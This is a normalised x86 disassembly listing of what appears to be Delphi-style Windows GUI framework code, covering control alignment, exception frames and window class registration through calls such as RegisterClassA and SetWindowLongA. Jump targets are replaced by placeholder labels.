mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_442849
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442850
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44275e ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_4063e4
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4426c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_4063e4
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_442850
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44287f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_442908
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4430fc
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_417d38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_417e94
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_4424c8
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4430c0
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_417f10
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_417e94
mov edx eax
mov ecx ebx
mov eax edi
call sub_44243c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_442a78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4430fc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4430c0
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4430c0
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_442acc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_442a78
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442bab
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_442908
pop ecx
push ebp
mov al 0x2
call sub_442908
pop ecx
push ebp
mov al 0x3
call sub_442908
pop ecx
push ebp
mov al 0x4
call sub_442908
pop ecx
push ebp
mov al 0x5
call sub_442908
pop ecx
push ebp
mov al 0x6
call sub_442908
pop ecx
push ebp
xor eax eax
call sub_442908
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403368
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_442bd0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442c64
xor eax eax
push ebp
push sub_442c57
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_442c94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442d59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d60
mov eax [ ebp - 0xc ]
call sub_40316c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_417d38
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43f320
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_417e94
xor ecx ecx
mov edx 0xb03e
call sub_440d98
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_442d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4430fc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_442c64
xor edx edx
push ebp
push sub_442e4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_417d38
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_417e94
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43f0c4
mov dl 0x4
call sub_43f0c4
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_417d84
sub_442ebc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_457570
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45b38c
sub_442edc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43e4a4
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43e4a4
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43e4a4
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_442f28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43e4cc
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43e4cc
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43e4cc
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_442f70
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403368
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_440d98
mov edx ebx
mov eax edi
call sub_442edc
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_440d98
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440d98
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax edi
call sub_446754
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_440d98
mov eax edi
call sub_443ac0
jmp r-xdata
mov edx ebx
mov eax edi
call sub_442bd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443044
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_440d98
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax esi
call sub_446754
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_442ebc
mov eax ebp
call sub_443924
jmp r-xdata
mov edx ebx
mov eax esi
call sub_442f28
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_440d98
mov eax esi
call sub_442c8c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43fff8
sub_4430c0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_417e94
mov edx edi
mov eax ebp
call sub_417e94
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44311c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4430c0
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44315c
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44311c
add esp 0x10
retn
sub_443184
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4431f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4401f4
test al al
je r-xdata
mov eax ebx
call sub_440224
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403368
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403368
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_443258
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_443376
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b80
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4431f0
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_446450
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041a4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408ae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44337d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_443384
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_443545
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43c950
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43c950
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ce50
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ce50
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408c88
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_446760
push 0x1
mov eax [ esi + 0x68 ]
call sub_421a20
mov ecx eax
mov edx 0x30
mov eax esi
call sub_440d98
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_446450
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44354c
lea eax [ ebp - 0xc0 ]
call sub_403f40
retn
mov eax esi
mov si 0xffee
call sub_403368
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_443554
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d1c
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_443594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c5b0
mov eax esi
call sub_41c500
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41c500
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41c5b8
pop esi
pop ebx
retn
sub_4435cc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ddfc
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41dd88
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41dd88
mov eax esi
call sub_41de04
add esp 0x10
pop esi
pop ebx
retn
sub_443634
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_443620
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
